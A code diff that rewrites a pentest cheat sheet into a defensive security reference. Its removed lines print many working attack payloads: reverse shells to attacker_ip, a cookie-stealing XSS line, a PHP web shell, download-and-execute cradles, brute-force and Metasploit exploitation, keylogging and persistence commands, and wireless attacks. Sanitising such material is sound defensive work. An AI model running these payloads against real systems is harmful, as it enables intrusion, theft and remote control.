@@ -18,10 +18,10 @@
 ## Table of Contents
 1. [Ethical Hacking Fundamentals](#ethical-hacking-fundamentals)
 2. [Reconnaissance & Information Gathering](#reconnaissance--information-gathering)
-3. [Network Security & Exploitation](#network-security--exploitation)
+3. [Network Security & Exposure Management](#network-security--exposure-management)
 4. [Web Application Security](#web-application-security)
-5. [System Hacking & Post-Exploitation](#system-hacking--post-exploitation)
-6. [Metasploit Framework](#metasploit-framework)
+5. [Endpoint Security and Incident Response](#endpoint-security-and-incident-response)
+6. [Exploitation Frameworks: Defensive Use](#exploitation-frameworks-defensive-use)
 7. [Wireless Network Security](#wireless-network-security)
 8. [Social Engineering](#social-engineering)
 9. [Cryptography Essentials](#cryptography-essentials)
@@ -32,7 +32,7 @@
 ---
 
 ## 🎯 Purpose
-A condensed, command-first quick-reference - where [ultimate_cybersecurity_master_guide.md](ultimate_cybersecurity_master_guide.md) explains methodology in depth, this file is the "essentials at a glance" version for looking something up mid-engagement.
+A concise defensive reference. [ultimate_cybersecurity_master_guide.md](ultimate_cybersecurity_master_guide.md) covers broader methodology; this guide highlights safe review, detection, and response practices.
 
 ## ⚙️ Function
 12 topic sections mirroring the master guide's core lifecycle (recon through OSCP prep) but stripped to bullet points and command snippets, plus a dedicated "Quick Reference Commands" section at the end. Differs from [ultimate_cybersecurity_master_guide.md](ultimate_cybersecurity_master_guide.md) and [ENHANCED_MASTER_GUIDE.md](ENHANCED_MASTER_GUIDE.md) by omitting explanation/context in favor of density - no prose walkthroughs, just what to run and when.
@@ -41,12 +41,12 @@ A condensed, command-first quick-reference - where [ultimate_cybersecurity_maste
 A command or concept can be located and copy-pasted in seconds without reading surrounding narrative.
 
 ## 📋 When to Use
-Mid-engagement, during a live exam (OSCP), or any time you already know the methodology and just need the exact syntax.
+During security reviews, defensive study, or authorized assessments when you need a concise reminder of core concepts and response steps.
 
 ## Ethical Hacking Fundamentals
 
 ### Core Concepts
-- **Definition**: Authorized attempt to gain unauthorized access to systems, applications, or data
+- **Definition**: Authorized assessment of systems, applications, or data to identify and validate security weaknesses within an approved scope
 - **Purpose**: Identify vulnerabilities before malicious actors exploit them
 - **Legal Framework**: Always obtain written authorization before testing
 
@@ -59,8 +59,8 @@ Mid-engagement, during a live exam (OSCP), or any time you already know the meth
 1. **Reconnaissance**: Information gathering
 2. **Scanning**: Identifying live systems and open ports
 3. **Gaining Access**: Exploiting vulnerabilities
-4. **Maintaining Access**: Persistence mechanisms
-5. **Covering Tracks**: Log manipulation and evidence removal
+4. **Attacker persistence behaviors**: Study persistence indicators to improve prevention and detection; do not establish persistence during an assessment unless explicitly authorized.
+5. **Evidence preservation and response**: Preserve logs and artifacts. Treat attempts to conceal activity as behaviors to detect, not routine assessment steps.
 
 ### Key Principles
 - **Confidentiality**: Information accessible only to authorized parties
@@ -122,755 +122,86 @@ nmap -sV -O target.com
 
 ---
 
-## Network Security & Exploitation
+## Network Security & Exposure Management
 
-### Port Scanning Techniques
+Network testing should begin with a written asset list, an approved time window, and an agreed rate and impact limit. Use the organization's authorized inventory and vulnerability-management tools; review findings against service ownership and business context before remediation.
 
-#### TCP Scanning
-- **SYN Scan (-sS)**: Stealthy, doesn't complete handshake
-- **Connect Scan (-sT)**: Full TCP connection
-- **ACK Scan (-sA)**: Firewall detection
-- **FIN Scan (-sF)**: Evades some firewalls
+### Defensive review checklist
 
-#### UDP Scanning
-```bash
-nmap -sU -p 53,161,500 target.com
-```
+- Identify internet-facing services and confirm each has an owner and business need.
+- Compare observed services with the approved asset inventory.
+- Review firewall, VPN, DNS, and authentication logs for unexpected access.
+- Prioritize known exploited vulnerabilities and externally reachable management services.
+- Coordinate active validation with system owners; stop if availability or scope is uncertain.
 
-#### Nmap NSE Scripts
-```bash
-# Vulnerability scanning
-nmap --script vuln target.com
-
-# Service enumeration
-nmap --script=banner target.com
-nmap --script=smb-enum-shares target.com
-```
-
-### Network Protocols & Vulnerabilities
-
-#### SMB/NetBIOS (Ports 139, 445)
-```bash
-# Enumeration
-enum4linux -a target.com
-smbclient -L //target.com
-nbtscan 192.168.1.0/24
-
-# Exploitation (EternalBlue)
-use exploit/windows/smb/ms17_010_eternalblue
-```
-
-#### FTP (Port 21)
-```bash
-# Anonymous login check
-ftp target.com
-# Username: anonymous
-
-# Banner grabbing
-nc target.com 21
-telnet target.com 21
-```
-
-#### SSH (Port 22)
-```bash
-# Version detection
-nc target.com 22
-
-# Brute force (use responsibly)
-hydra -l user -P wordlist.txt ssh://target.com
-```
-
-#### HTTP/HTTPS (Ports 80, 443)
-```bash
-# Directory enumeration
-dirb http://target.com
-gobuster dir -u http://target.com -w wordlist.txt
-feroxbuster -u http://target.com
-```
-
-### ARP Poisoning & MITM Attacks
-```bash
-# Enable IP forwarding
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
-# ARP spoofing
-arpspoof -i eth0 -t victim_ip gateway_ip
-arpspoof -i eth0 -t gateway_ip victim_ip
-
-# Using ettercap
-ettercap -T -M arp:remote /gateway_ip// /victim_ip//
-```
 
 ---
 
 ## Web Application Security
 
-### OWASP Top 10:2025 — current reference (the numbered examples below reflect older categories)
+Use an authorized test environment with synthetic accounts and data. Prefer code review, a staging copy, and non-destructive validation. Record the affected route, expected behavior, observed behavior, and remediation.
 
-The **current OWASP Top 10:2025**, as published by OWASP, is: **A01 Broken Access Control; A02 Security Misconfiguration; A03 Software Supply Chain Failures; A04 Cryptographic Failures; A05 Injection; A06 Insecure Design; A07 Authentication Failures; A08 Software or Data Integrity Failures; A09 Security Logging and Alerting Failures; A10 Mishandling of Exceptional Conditions.**
+### Review areas
 
-> [!WARNING]
-> The older numbered examples that follow are **historical examples, not the official 2025 ordering or a complete current taxonomy**. Use [OWASP's current list](https://top10.owasp.org/2025/) for teaching, audits, report mappings and findings.
+- **Access control:** Verify users can access only the records and actions allowed by their role.
+- **Input handling:** Use parameterized database access and context-aware output encoding. Validate on the server.
+- **Session and request integrity:** Use secure, HTTP-only, same-site cookies; require anti-CSRF protections for state-changing requests.
+- **File handling:** Allowlist required formats, inspect content rather than trusting extensions, store uploads outside executable paths, and enforce size limits.
+- **Server-side requests:** Restrict outbound destinations and block access to local, link-local, and metadata services.
+- **Dependencies and configuration:** Track supported versions, remove debug features, and keep secrets out of source and logs.
 
-#### 1. Broken Access Control
-- **Description**: Users can act outside intended permissions
-- **Examples**: URL manipulation, privilege escalation
-- **Testing**:
-```bash
-# Directory traversal
-http://target.com/file?path=../../../../etc/passwd
+Use the current OWASP Top 10 as a starting point, then map findings to the relevant application controls and threat model.
 
-# IDOR (Insecure Direct Object Reference)
-http://target.com/user?id=123 (try id=124,125,etc)
-```
-
-#### 2. Cryptographic Failures
-- **Description**: Weak encryption, plaintext storage
-- **Testing**: Check for SSL/TLS vulnerabilities
-```bash
-sslscan target.com
-testssl target.com
-```
-
-#### 3. Injection Attacks
-
-**SQL Injection**
-```sql
--- Authentication bypass
-' OR '1'='1
-admin'--
-admin' #
-
--- Union-based
-' UNION SELECT NULL,NULL,NULL--
-' UNION SELECT username,password FROM users--
-
--- Error-based
-' AND 1=CONVERT(int,(SELECT @@version))--
-
--- Blind SQL injection
-' AND 1=1--  (True)
-' AND 1=2--  (False)
-```
-
-**SQLMap Tool**
-```bash
-sqlmap -u "http://target.com/page?id=1" --dbs
-sqlmap -u "http://target.com/page?id=1" -D database --tables
-sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
-```
-
-**Command Injection**
-```bash
-; ls -la
-| whoami
-& ping -c 4 attacker.com
-`cat /etc/passwd`
-$(whoami)
-```
-
-**LDAP Injection**
-```
-*)(uid=*))(|(uid=*
-admin*)(&(password=*)
-```
-
-#### 4. Insecure Design
-- Design flaws in architecture
-- Missing security controls
-- Threat modeling failures
-
-#### 5. Security Misconfiguration
-```bash
-# Common misconfigurations
-- Default credentials
-- Unnecessary features enabled
-- Detailed error messages
-- Missing security headers
-
-# Testing
-curl -I http://target.com
-nikto -h target.com
-```
-
-#### 6. Vulnerable Components
-```bash
-# Identify components
-whatweb target.com
-wappalyzer (browser extension)
-
-# Check for known vulnerabilities
-searchsploit application_name
-```
-
-#### 7. Authentication Failures
-```bash
-# Brute force
-hydra -l admin -P wordlist.txt target.com http-post-form
-
-# Session attacks
-- Session fixation
-- Weak session IDs
-- Missing session timeout
-```
-
-#### 8. Data Integrity Failures
-- Insecure deserialization
-- Unsigned/unverified updates
-- CI/CD pipeline compromises
-
-#### 9. Logging Failures
-- Insufficient logging
-- Log injection attacks
-- Logs not monitored
-
-#### 10. Server-Side Request Forgery (SSRF)
-```bash
-# Testing SSRF
-http://target.com/fetch?url=http://localhost
-http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
-http://target.com/fetch?url=file:///etc/passwd
-```
-
-### Cross-Site Scripting (XSS)
-
-#### Reflected XSS
-```html
-<script>alert('XSS')</script>
-<img src=x onerror=alert('XSS')>
-<svg onload=alert('XSS')>
-```
-
-#### Stored XSS
-```html
-<script>document.location='http://attacker.com/?c='+document.cookie</script>
-```
-
-#### DOM-based XSS
-```javascript
-<script>
-var pos=document.URL.indexOf("name=")+5;
-document.write(document.URL.substring(pos,document.URL.length));
-</script>
-```
-
-#### XSS Payload Obfuscation
-```html
-<IMG SRC=javascript:alert('XSS')>
-<BODY ONLOAD=alert('XSS')>
-<iframe src=javascript:alert('XSS')>
-```
-
-### Cross-Site Request Forgery (CSRF)
-```html
-<img src="http://bank.com/transfer?amount=1000&to=attacker" style="display:none">
-
-<form action="http://bank.com/transfer" method="POST">
-  <input type="hidden" name="amount" value="1000">
-  <input type="hidden" name="to" value="attacker">
-</form>
-<script>document.forms[0].submit();</script>
-```
-
-### File Upload Vulnerabilities
-```php
-# PHP reverse shell
-<?php system($_GET['cmd']); ?>
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'"); ?>
-
-# Upload bypasses
-- Double extensions: shell.php.jpg
-- Null byte: shell.php%00.jpg
-- MIME type manipulation
-- Magic number modification
-```
 
 ---
 
-## System Hacking & Post-Exploitation
+## Endpoint Security and Incident Response
 
-### Password Cracking
+### Credential protection
 
-#### Hash Identification
-```bash
-hash-identifier
-hashid hash_value
-```
+Store passwords with a slow, unique salt-based password hashing function such as Argon2id, scrypt, or appropriately configured bcrypt. Do not store plaintext passwords or reuse production credentials in labs. Protect privileged credentials with phishing-resistant MFA, managed service identities, and least privilege.
 
-#### John the Ripper
-```bash
-# Crack password hashes
-john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-john --format=NT hashes.txt
-john --show hashes.txt
+### Endpoint review
 
-# Generate wordlist
-john --wordlist=words.txt --rules --stdout > mutated.txt
-```
+- Inventory local administrators, services, scheduled tasks, startup entries, and security-control status.
+- Investigate unexpected changes using endpoint telemetry and approved baselines.
+- Monitor unusual parent-child process relationships, script interpreters, unsigned binaries, and unexpected outbound connections.
+- Preserve relevant logs and volatile evidence before containment when practical.
+- Rebuild or restore a compromised endpoint from a known-good image after evidence collection and credential rotation.
 
-#### Hashcat
-```bash
-# MD5
-hashcat -m 0 -a 0 hash.txt wordlist.txt
+### Response sequence
 
-# NTLM
-hashcat -m 1000 -a 0 hash.txt wordlist.txt
+Alert and report → validate scope and impact → preserve logs and evidence → contain the affected endpoint → remove the cause and rotate credentials → restore from a known-good state → document lessons.
 
-# SHA-256
-hashcat -m 1400 -a 0 hash.txt wordlist.txt
-
-# Brute force
-hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a
-```
-
-> [!TIP]
-> Leet substitutions (`P@55w0rd`) are covered by hashcat's bundled leet rule files. See [leet in passwords](./Cryptography/Classical/security.md#leet-in-passwords).
-
-#### Hydra (Online Attacks)
-```bash
-# SSH
-hydra -l username -P wordlist.txt ssh://target.com
-
-# FTP
-hydra -l admin -P wordlist.txt ftp://target.com
-
-# HTTP POST
-hydra -l admin -P wordlist.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
-
-# RDP
-hydra -l administrator -P wordlist.txt rdp://target.com
-```
-
-### Windows Exploitation
-
-#### Common Vulnerabilities
-- **MS17-010 (EternalBlue)**: SMB vulnerability
-- **MS08-067**: Windows Server Service vulnerability
-- **MS14-058**: TrackPopupMenu vulnerability
-
-#### Windows Privilege Escalation
-```batch
-# System information
-systeminfo
-hostname
-whoami /all
-
-# User enumeration
-net user
-net localgroup administrators
-net user /domain
-
-# Network information
-ipconfig /all
-route print
-arp -a
-netstat -ano
-
-# Running processes
-tasklist /svc
-wmic process list brief
-
-# Scheduled tasks
-schtasks /query /fo LIST /v
-
-# Unquoted service paths
-wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
-
-# Writable services
-accesschk.exe -uwcqv "Authenticated Users" *
-
-# Registry auto-runs
-reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
-reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-```
-
-#### PowerShell Commands
-```powershell
-# Execution policy bypass
-powershell -ExecutionPolicy Bypass -File script.ps1
-powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
-
-# Get system info
-Get-ComputerInfo
-Get-WmiObject -Class Win32_OperatingSystem
-
-# Find files
-Get-ChildItem -Path C:\ -Include *.txt,*.pdf -Recurse -ErrorAction SilentlyContinue
-
-# Download file
-Invoke-WebRequest -Uri http://attacker.com/file.exe -OutFile file.exe
-```
-
-### Linux Exploitation
-
-#### Linux Privilege Escalation
-```bash
-# System enumeration
-uname -a
-cat /etc/issue
-cat /etc/*-release
-hostname
-
-# User information
-id
-whoami
-who
-w
-last
-cat /etc/passwd
-cat /etc/shadow
-
-# Sudo privileges
-sudo -l
-
-# SUID files
-find / -perm -4000 -type f 2>/dev/null
-find / -perm -u=s -type f 2>/dev/null
-
-# Writable directories
-find / -writable -type d 2>/dev/null
-find / -perm -222 -type d 2>/dev/null
-
-# Cron jobs
-crontab -l
-cat /etc/crontab
-ls -la /etc/cron.*
-
-# World-writable scripts in PATH
-echo $PATH
-find / -type f -writable 2>/dev/null
-
-# Capabilities
-getcap -r / 2>/dev/null
-
-# Kernel exploits
-searchsploit linux kernel version
-```
-
-#### GTFOBins Exploitation
-- Sudo commands that can be exploited
-- SUID binaries for privilege escalation
-- Capabilities abuse
-
-Examples:
-```bash
-# vim
-sudo vim -c ':!/bin/sh'
-
-# find
-sudo find / -exec /bin/sh \; -quit
-
-# nmap (older versions)
-echo "os.execute('/bin/sh')" > shell.nse
-sudo nmap --script=shell.nse
-
-# python
-sudo python -c 'import os; os.system("/bin/sh")'
-```
-
-### Reverse Shells
-
-#### Netcat Listeners
-```bash
-# Attacker machine
-nc -lvnp 4444
-nc -lvnp 4444 -e /bin/bash  # Windows
-
-# Victim machine (Linux)
-nc attacker_ip 4444 -e /bin/bash
-bash -i >& /dev/tcp/attacker_ip/4444 0>&1
-
-# Victim machine (Windows)
-nc attacker_ip 4444 -e cmd.exe
-```
-
-#### Bash Reverse Shell
-```bash
-bash -i >& /dev/tcp/attacker_ip/4444 0>&1
-0<&196;exec 196<>/dev/tcp/attacker_ip/4444; sh <&196 >&196 2>&196
-```
-
-#### Python Reverse Shell
-```python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-```
-
-#### PHP Reverse Shell
-```php
-php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
-```
-
-#### PowerShell Reverse Shell
-```powershell
-$client = New-Object System.Net.Sockets.TCPClient("attacker_ip",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-```
-
-### Upgrading Shells
-```bash
-# Python TTY
-python -c 'import pty; pty.spawn("/bin/bash")'
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-
-# CTRL+Z (background shell)
-stty raw -echo; fg
-# Then press Enter twice
-
-# Set terminal
-export TERM=xterm
-export SHELL=bash
-
-# Alternative methods
-echo os.system('/bin/bash')
-/bin/sh -i
-perl -e 'exec "/bin/sh";'
-ruby: exec "/bin/sh"
-```
 
 ---
 
-## Metasploit Framework
+## Exploitation Frameworks: Defensive Use
 
-> [!NOTE]
-> **Defensive reference:** for monitoring and response guidance related to remote administration tools, see
-> [Metasploit and Remote Administration Tools](advanced_techniques_supplement.md#metasploit-and-remote-administration-tools).
-> These are quick-reference notes.
+Frameworks can help reproduce a vulnerability in a deliberately vulnerable, isolated lab or validate a vendor patch under an approved test plan. Their modules can affect availability, expose data, or change a target, so treat every module as a potentially disruptive action.
 
-### Basic Commands
-```bash
-# Start Metasploit
-msfconsole
+Before a test, document the exact lab target, approved module and version, expected changes, rollback method, and stop conditions. Do not run exploit, credential-dumping, persistence, webcam, keylogging, or pivoting features against production systems. Prefer vendor advisories, safe configuration checks, and patch verification for routine assessments.
 
-# Update
-msfupdate
+### Validation lifecycle
 
-# Search
-search type:exploit platform:windows
-search cve:2017 type:exploit
+Vendor advisory → inventory affected versions → apply mitigation or patch → perform a safe version/configuration check → review logs and residual risk.
 
-# Module info
-info exploit/windows/smb/ms17_010_eternalblue
-
-# Use module
-use exploit/windows/smb/ms17_010_eternalblue
-
-# Show options
-show options
-show payloads
-show targets
-
-# Set options
-set RHOSTS target_ip
-set RHOST target_ip
-set LHOST attacker_ip
-set LPORT 4444
-set payload windows/meterpreter/reverse_tcp
-
-# Run exploit
-exploit
-run
-
-# Background session
-background
-CTRL+Z
-
-# List sessions
-sessions -l
-
-# Interact with session
-sessions -i 1
-```
-
-### Common Exploits
-```bash
-# EternalBlue (MS17-010)
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS target_ip
-set payload windows/x64/meterpreter/reverse_tcp
-set LHOST attacker_ip
-exploit
-
-# BlueKeep (MS12-020)
-use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
-
-# Tomcat Manager
-use exploit/multi/http/tomcat_mgr_upload
-
-# Jenkins Script Console
-use exploit/multi/http/jenkins_script_console
-
-# Apache Struts
-use exploit/multi/http/struts2_content_type_ognl
-```
-
-### Meterpreter Commands
-```bash
-# System
-sysinfo
-getuid
-getpid
-ps
-
-# User
-getuid
-getsystem  # Privilege escalation
-hashdump   # Dump password hashes
-
-# File system
-pwd
-ls
-cd
-cat file.txt
-download file.txt
-upload malware.exe
-search -f *.txt
-
-# Network
-ipconfig
-route
-arp
-netstat
-
-# Process
-ps
-getpid
-migrate PID
-kill PID
-
-# Screenshot & webcam
-screenshot
-webcam_snap
-webcam_stream
-
-# Keylogging
-keyscan_start
-keyscan_dump
-keyscan_stop
-
-# Persistence
-run persistence -X -i 10 -p 4444 -r attacker_ip
-
-# Pivoting
-run autoroute -s 10.10.10.0/24
-portfwd add -l 3389 -p 3389 -r target_ip
-
-# Shell
-shell  # Drop to system shell
-```
-
-### Post-Exploitation Modules
-```bash
-# Credential harvesting
-use post/windows/gather/credentials/credential_collector
-use post/windows/gather/enum_chrome
-
-# Network enumeration
-use post/windows/gather/arp_scanner
-use post/windows/gather/enum_shares
-
-# Privilege escalation
-use post/multi/recon/local_exploit_suggester
-use post/windows/gather/enum_patches
-
-# Lateral movement
-use exploit/windows/smb/psexec
-use exploit/windows/smb/psexec_psh
-```
-
-### Auxiliary Modules
-```bash
-# Scanners
-use auxiliary/scanner/portscan/tcp
-use auxiliary/scanner/smb/smb_version
-use auxiliary/scanner/http/dir_scanner
-use auxiliary/scanner/ssh/ssh_login
-
-# Sniffers
-use auxiliary/sniffer/psnuffle
-
-# Denial of Service
-use auxiliary/dos/tcp/synflood
-
-# Fuzzing
-use auxiliary/fuzzers/http/http_form_field
-```
 
 ---
 
 ## Wireless Network Security
 
-### Wi-Fi Protocols
-- **WEP**: Deprecated, easily crackable
-- **WPA**: Better than WEP, still vulnerable
-- **WPA2**: Widely deployed; patch vulnerabilities, enforce strong PSKs or enterprise authentication, validate PMF and client updates
-- **WPA3**: Modern security suite with SAE/enterprise modes; not equivalent to WPA2-PSK capture/cracking and still requires secure configuration
+Assess wireless security through approved configuration review and passive monitoring. Obtain authorization from the network owner and coordinate with nearby tenants because radio testing can affect networks outside the intended scope.
 
-### Wireless Reconnaissance
-```bash
-# Put interface in monitor mode
-airmon-ng check kill
-airmon-ng start wlan0
+### Configuration and monitoring checklist
 
-# Scan for networks
-airodump-ng wlan0mon
+- Prefer WPA3 or WPA2-AES; disable WEP, TKIP, and WPS where supported.
+- Use unique administrative and network credentials; rotate defaults.
+- Enable protected management frames where clients support them.
+- Separate guest and IoT devices from administrative systems.
+- Monitor for unauthorized access points, unexpected association patterns, and authentication failures.
+- Use a controlled lab to study attack behavior; do not capture third-party traffic or induce client disconnections.
 
-# Capture handshake
-airodump-ng -c channel --bssid AP_MAC -w capture wlan0mon
-
-# ACTIVE DEAUTH - lab-only and disruptive. PMF can block forged disconnects.
-# For passive monitoring see Documentation/wifi-deauthentication-detection.md
-aireplay-ng --deauth 10 -a AP_MAC wlan0mon
-```
-
-### WPA/WPA2 Cracking
-```bash
-# Crack handshake
-aircrack-ng -w wordlist.txt -b AP_MAC capture.cap
-
-# Using Hashcat
-cap2hccapx capture.cap output.hccapx
-hashcat -m 2500 output.hccapx wordlist.txt
-```
-
-### Evil Twin Attack
-```bash
-# Create rogue AP
-airbase-ng -e "FreeWiFi" -c 6 wlan0mon
-
-# DHCP server
-dhcpd -cf /etc/dhcp/dhcpd.conf
-
-# DNS spoofing
-dnsspoof -i at0
-
-# SSL strip
-sslstrip -l 8080
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
-```
-
-### Wi-Fi Protected Setup (WPS) Attacks
-```bash
-# Scan for WPS-enabled APs
-wash -i wlan0mon
-
-# Pixie Dust attack
-reaver -i wlan0mon -b AP_MAC -c channel -K
-
-# Brute force PIN
-reaver -i wlan0mon -b AP_MAC -c channel -vv
-```
-
-### Bluetooth Hacking
-```bash
-# Scan for devices
-hcitool scan
-bluetoothctl scan on
-
-# Device info
-hcitool info MAC_ADDRESS
-
-# L2ping DoS
-l2ping -i hci0 -s 600 -f MAC_ADDRESS
-```
 
 ---
 
@@ -1284,67 +615,37 @@ configuration review
 
 ---
 
-## Quick Reference Commands
+## Quick Reference: Defensive Host Checks
 
-### Network Scanning
-```bash
-nmap -sC -sV -oA scan target.com
-nmap -p- -T4 target.com
-nmap --script vuln target.com
-```
+Run local checks only on systems you administer. These commands display host configuration; they do not scan or change remote systems.
 
-### Web Enumeration
-```bash
-gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
-ffuf -u http://target.com/FUZZ -w wordlist.txt
-nikto -h http://target.com
-```
+### Windows
 
-### SMB Enumeration
-```bash
-enum4linux -a target.com
-smbclient -L //target.com
-smbmap -H target.com
-```
+    # Show IP and DNS configuration
+    Get-NetIPConfiguration
 
-### File Transfers
-```bash
-# HTTP Server (Python)
-python3 -m http.server 80
-python2 -m SimpleHTTPServer 80
+    # Review firewall profile state
+    Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction
 
-# Download (Windows)
-certutil -urlcache -f http://attacker/file.exe file.exe
-powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker/file.exe','file.exe')"
+    # Review Defender real-time protection status
+    Get-MpComputerStatus | Select-Object AMServiceEnabled, AntivirusEnabled, RealTimeProtectionEnabled
 
-# Download (Linux)
-wget http://attacker/file
-curl http://attacker/file -o file
-```
+### Linux
 
-### Shells
-```bash
-# Listener
-nc -lvnp 4444
-rlwrap nc -lvnp 4444
+    # Show local addresses and routes
+    ip address
+    ip route
 
-# Reverse shell
-bash -i >& /dev/tcp/attacker_ip/4444 0>&1
-nc attacker_ip 4444 -e /bin/bash
-```
+    # Show listening sockets and owning processes (requires appropriate privileges)
+    ss -lntup
 
-### Privilege Escalation
-```bash
-# Linux
-sudo -l
-find / -perm -4000 -type f 2>/dev/null
-LinPEAS.sh
+    # Review recent warning-level system events
+    journalctl --since "1 hour ago" --priority warning
 
-# Windows
-whoami /priv
-icacls "path"
-winPEAS.exe
-```
+### Evidence and escalation
+
+Preserve relevant logs, timestamps, and system identifiers. Follow the incident-response plan for containment and evidence handling. Do not clear logs, disable protections, or transfer data to personal storage as a troubleshooting shortcut.
+
 
 ---
 
